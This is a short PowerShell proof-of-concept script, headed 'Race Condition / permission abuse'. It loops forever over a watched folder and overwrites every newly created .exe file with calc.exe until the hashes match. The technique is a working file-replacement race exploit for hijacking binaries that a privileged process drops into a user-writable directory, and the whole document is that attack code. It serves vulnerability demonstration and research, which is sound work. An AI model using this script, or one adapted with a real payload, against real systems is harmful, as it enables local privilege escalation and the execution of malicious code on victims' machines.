#Race Condition / permission abuse

Clear-Host
$ext = ".exe" # could be .exe, .dll, .msi
$pocEXE = 'C:\Windows\system32\calc.exe'
$vulnFolder = 'C:\Users\michael\Documents\test\POC-RC\test'
$hashExe = (Get-FileHash  $pocEXE -Algorithm MD5).Hash


$ref = Get-ChildItem -Recurse -File -Path $vulnFolder
if($null -eq $ref){ $ref = [System.Object[]] }

While(1){

    $new = Get-ChildItem -Recurse -File -Path $vulnFolder
    if($null -eq $new){ $new = [System.Object[]] }

    $diff = Compare-Object -ReferenceObject $ref -DifferenceObject $new

    $diff |ForEach-Object { 
        $object = $_
        if( $object.SideIndicator -eq '=>'){
            $file = $object.InputObject.FullName
                if($file -match ($ext +'$')){
                    While( (Get-FileHash $file -Algorithm MD5).Hash -ne $hashExe ){
                        copy-item $pocEXE $file -Verbose
                    }
                }
        }
    }
    $ref = $new
}